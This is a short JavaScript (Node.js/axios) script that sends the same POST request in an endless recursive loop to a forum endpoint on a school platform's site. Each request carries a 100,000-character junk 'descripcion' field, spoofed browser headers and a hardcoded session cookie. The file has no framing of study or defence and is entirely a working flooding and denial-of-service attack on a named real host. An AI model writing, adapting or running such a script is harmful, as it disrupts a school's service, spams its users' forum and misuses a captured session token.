const axios = require('axios').default;

let i = 0;

async function ejecutarPeticion() {
  try {
    const url = 'http://appu.educarperu.com/admincolegio/vista_alumnoappu/foros_admin.php?q=agregardetalle&clase=126&codgrupo=2023ASG0861SA';
    const headers = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0',
      'Accept': '*/*',
      'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'X-Requested-With': 'XMLHttpRequest',
      'Cookie': 'PHPSESSID=1kodpcc9mt6u9be0lej8sidfn4'
    };
    const referrer = 'http://appu.educarperu.com/admincolegio/vista_alumnoappu/clases.php';
    const body = `descripcion=${'ñ'.repeat(Math.pow(10, 5))}`;
    
    await axios.post(url, body, { headers, referrer })
  
    i++;

    console.log(i);
  } catch(e) {
    console.error(e);
  }
  
  return ejecutarPeticion();
}

ejecutarPeticion();
